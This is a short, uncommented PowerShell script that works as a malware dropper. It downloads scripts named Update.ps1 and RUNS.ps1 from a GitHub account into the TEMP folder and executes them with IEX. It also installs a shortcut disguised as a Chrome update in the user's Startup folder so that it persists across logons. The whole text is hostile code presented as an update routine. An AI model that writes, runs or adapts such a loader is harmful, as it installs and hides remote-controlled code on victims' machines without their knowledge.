$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/Update.ps1"
$output6 = "$env:TEMP\Update.ps1"
Invoke-WebRequest -Uri $url6 -OutFile $output6
IEX (Get-Content $output6 | Out-String)
$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
Invoke-WebRequest -Uri $url8 -OutFile $output8
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
$output5 = "$env:TEMP\RUNS.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX (Get-Content $output5 | Out-String)
